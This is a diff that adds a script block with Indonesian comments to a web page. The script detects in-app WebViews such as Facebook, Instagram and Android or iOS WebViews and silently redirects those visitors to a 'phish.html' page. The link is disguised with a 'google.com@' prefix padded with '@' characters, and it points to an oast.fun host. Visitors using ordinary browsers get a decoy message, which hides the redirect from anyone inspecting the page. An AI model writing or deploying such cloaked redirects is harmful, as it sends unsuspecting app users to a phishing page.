@@ -1,0 +1,24 @@
+<script>
+(function(){
+  // Deteksi apakah halaman sedang dibuka di dalam WebView
+  const isWebView = (() => {
+    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+    return (
+      (/\bwv\b/.test(userAgent)) ||                         // Android WebView
+      (/; wv/.test(userAgent)) ||                           // Variasi lain
+      (/FBAV|Instagram/.test(userAgent)) ||                 // Social apps
+      (/iPhone|iPod|iPad/.test(userAgent) && !window.MSStream && !window.webkit) // iOS WebView
+    );
+  })();
+
+  if (isWebView) {
+    // Silent redirect (target ke domain Anda)
+    setTimeout(() => {
+      window.location.href = 'https://google.com@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/phish.html';
+    }, 1000);
+  } else {
+    // Jika dibuka dari browser biasa, tunjukkan dummy halaman
+    document.body.innerHTML = "<h2>This page must be opened inside an app</h2>";
+  }
+})();
+</script>
